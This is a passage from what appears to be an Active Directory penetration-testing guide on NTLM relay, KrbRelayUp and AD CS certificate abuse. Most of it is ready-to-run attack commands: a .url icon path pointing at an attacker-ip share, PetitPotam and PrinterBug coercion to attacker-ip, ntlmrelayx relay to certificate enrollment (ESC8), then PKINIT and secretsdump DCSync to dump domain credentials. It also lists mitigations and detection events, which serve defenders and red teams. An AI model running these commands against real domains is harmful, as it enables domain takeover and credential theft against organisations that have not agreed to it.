IconFile=\\attacker-ip\share\icon.ico
ENDURL
  • Coerce DC authentication with PetitPotam (MS-EFSR): 
    python3 PetitPotam.py -d corp.local -u user -p 'Password123' attacker-ip dc01.corp.local
  • Coerce DC authentication with PrinterBug (MS-RPRN): 
    python3 printerbug.py corp.local/user:'Password123'@dc01.corp.local attacker-ip
  • Scan for all available coercion methods with Coercer: 
    python3 coercer.py scan -t dc01.corp.local -u user -p 'Password123' -d corp.local
python3 coercer.py coerce -t dc01.corp.local -l attacker-ip -u user -p 'Password123' -d corp.local

9.5 Advanced Relay and Mitigations

KrbRelayUp is a local privilege escalation tool that combines NTLM relay with Kerberos. It works by triggering a local DCOM NTLM authentication, relaying it to LDAP on the DC to configure Resource-Based Constrained Delegation (RBCD) on the local machine account, and then using S4U2self/S4U2proxy to obtain a service ticket as a privileged user.

9.5.1 Advanced NTLM Relay Attacks Targeting Kerberos

KrbRelayUp is a local privilege escalation tool that combines NTLM relay with Kerberos. It works by triggering a local DCOM NTLM authentication, relaying it to LDAP on the DC to configure Resource-Based Constrained Delegation (RBCD) on the local machine account, and then using S4U2self/S4U2proxy to obtain a service ticket as a privileged user.

# KrbRelayUp (automated, runs on the target machine)
KrbRelayUp.exe relay -m rbcd -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}

# This performs:
# 1. Creates a machine account (or uses an existing one)
# 2. Triggers DCOM authentication to itself
# 3. Relays the NTLM auth to LDAP on the DC
# 4. Configures RBCD: allows the new machine account to delegate to the local machine
# 5. Uses S4U2self/S4U2proxy to get a service ticket as Administrator
# 6. Performs a pass-the-ticket attack

KrbRelayUp also supports Shadow Credentials mode (-m shadowcred), which sets a key credential on the local machine account instead of configuring RBCD.

9.5.2 Advanced NTLM Relay Attacks Targeting AD CS

NTLM relay to AD CS HTTP enrollment endpoints (ESC8) allows an attacker to request a certificate as the relayed account. If a domain controller's machine account is coerced and relayed, the attacker obtains a DC certificate, enabling DCSync or authentication as the DC.

# Step 1: Start ntlmrelayx targeting the CA's HTTP enrollment endpoint
sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce the DC to authenticate (PetitPotam)
python3 PetitPotam.py -d corp.local -u user -p 'Password123' attacker-ip dc01.corp.local

# Step 3: ntlmrelayx automatically requests a certificate as DC01$
# Output: Base64-encoded certificate for DC01$

# Step 4: Use the certificate for PKINIT
python3 gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass <pass> corp.local/dc01\$ dc01.ccache

# Step 5: DCSync with the TGT
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass dc01.corp.local

Mitigation for ESC8:

  • Disable HTTP enrollment endpoints on the CA (use HTTPS with EPA instead)
  • Enable Extended Protection for Authentication (EPA) on IIS
  • Disable NTLM authentication on the CA server
  • Apply security updates and restrict certificate template enrollment permissions

9.5.3 NTLM Relay Attack Summary

The following matrix summarizes NTLM relay paths, prerequisites, and outcomes:

Source ProtocolTarget ProtocolPrerequisiteOutcome
SMBSMBNo SMB signing on target; local admin on targetCommand execution, credential dump
SMBLDAPNo LDAP signing; no channel bindingACL modification, RBCD, Shadow Credentials
SMBHTTP (ADCS)HTTP enrollment enabled on CACertificate request as victim
HTTPSMBNo SMB signing on targetCommand execution, credential dump
HTTPLDAPNo LDAP signing (channel binding bypassed)ACL modification, RBCD, Shadow Credentials
HTTPHTTP (ADCS)HTTP enrollment enabled on CACertificate request as victim
WebDAVLDAPWebClient service running; no LDAP signingACL modification, RBCD
DCOM (local)LDAPKrbRelayUp scenarioLocal privilege escalation via RBCD

Key mitigations across all relay scenarios:

  • Enable SMB signing on all systems (required on DCs by default; enforce on servers and workstations via GPO)
  • Enforce LDAP signing and channel binding on all domain controllers (LdapServerIntegrity = 2)
  • Disable NTLM where possible; use Kerberos exclusively. Apply NTLM restrictions via GPO (Network Security: Restrict NTLM)
  • Enable Extended Protection for Authentication (EPA) on IIS, Exchange, and ADCS HTTP endpoints
  • Disable LLMNR and NBT-NS via GPO to prevent name resolution poisoning
  • Disable IPv6 if not in use to prevent DHCPv6 poisoning (mitm6)
  • Patch coercion vulnerabilities: PetitPotam, PrinterBug (disable Print Spooler on DCs), DFSCoerce
  • Set MachineAccountQuota to 0 to prevent KrbRelayUp-style attacks that create machine accounts for RBCD
  • Monitor: Event ID 4624 (logon type 3) for unusual NTLM authentication patterns, and Event ID 8004 for NTLM audit events

Methodology

  • Run KrbRelayUp for local privilege escalation via RBCD: 
    KrbRelayUp.exe relay -m rbcd -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}
  • Start ntlmrelayx targeting ADCS HTTP enrollment for ESC8: 
    sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
  • Coerce the DC to authenticate to the relay listener: 
    python3 PetitPotam.py -d corp.local -u user -p 'Password123' attacker-ip dc01.corp.local
  • Use the relayed DC certificate for PKINIT to obtain a TGT: 
    python3 gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass  corp.local/dc01\$ dc01.ccache
  • DCSync with the obtained TGT: 
    export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass dc01.corp.local

10. ADCS Attacks

Active Directory Certificate Services (AD CS) is a Windows Server role that provides public key infrastructure (PKI) for issuing and managing digital certificates. Misconfigurations in AD CS can grant domain-wide compromise through certificate abuse, often with fewer detection signatures than traditional credential attacks.

10.1 ADCS Fundamentals

AD CS implements a PKI that issues X.509 certificates used for authentication, encryption, and code signing within Active Directory environments. The core components:

ComponentRole
Certificate Authority (CA)Issues and revokes certificates; can be Enterprise (AD-integrated) or Standalone
Certificate TemplatesBlueprints defining certificate purpose, validity, enrollment permissions, and cryptographic settings
Enrollment ServicesWeb enrollment (HTTP), RPC (ICPR), and DCOM interfaces for requesting certificates
Extended Key Usages (EKUs)OIDs that define what a certificate can be used for (Client Authentication, Smart Card Logon, Any Purpose, etc.)
Certificate Revocation List (CRL)Published list of revoked certificates checked during validation

Enterprise CAs are domain-joined and publish templates to Active Directory. When a principal enrolls in a template, the CA issues a certificate based on the template's configuration. The critical EKUs for authentication abuse are:

  • Client Authentication (OID 1.3.6.1.5.5.7.3.2) allows the certificate holder to authenticate to services
  • Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2) enables certificate-based domain logon via PKINIT
  • Any Purpose (OID 2.5.29.37.0) permits the certificate for any use, including authentication
  • No EKU / SubCA certificates are unrestricted and can be used for any purpose

10.2 ADCS Enumeration

Identifying Enterprise CAs and vulnerable certificate templates is the first step. Several tools automate this process.

Certify (Windows):

# Find all Enterprise CAs
Certify.exe cas

# Find vulnerable certificate templates
Certify.exe find /vulnerable

# Find templates with specific EKU
Certify.exe find /clientauth

# Enumerate templates the current user can enroll in
Certify.exe find /enrolleeSuppliesSubject

Certipy (Linux):

# Enumerate all templates and CAs
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10

# Find vulnerable templates only
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10 -vulnerable

# Output as BloodHound-compatible JSON
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10 -old-bloodhound

Certutil (built-in):

# List Enterprise CAs
certutil -config - -ping

# Dump CA configuration
certutil -TCAInfo

# List certificate templates published by a CA
certutil -catemplates

Methodology

  • Enumerate all Enterprise CAs and published templates with Certify: 
    Certify.exe cas
Certify.exe find /vulnerable
  • Run Certipy from Linux to enumerate vulnerable templates: 
    certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10 -vulnerable
  • Export BloodHound-compatible JSON for ADCS attack path analysis: 
    certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10 -old-bloodhound
  • Find templates with Enrollee Supplies Subject flag: 
    Certify.exe find /enrolleeSuppliesSubject
  • Verify CA availability and list published templates with certutil: 
    certutil -config - -ping
certutil -catemplates

10.3 Template Misconfiguration Attacks (ESC1-4)

ESC1 is the most common ADCS misconfiguration. It occurs when a certificate template allows the enrollee to specify an arbitrary Subject Alternative Name (SAN), combined with an EKU that permits authentication.

10.3.1 ESC1: Misconfigured Certificate Template (Enrollee Supplies Subject)

ESC1 is the most common ADCS misconfiguration. It occurs when a certificate template allows the enrollee to specify an arbitrary Subject Alternative Name (SAN), combined with an EKU that permits authentication.

Vulnerability Conditions

All four conditions must be met simultaneously:

  • The Enterprise CA grants enrollment rights to low-privileged users
  • Manager approval is disabled (no CA certificate manager must approve the request)
  • The template has the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set, allowing the requester to specify the SAN
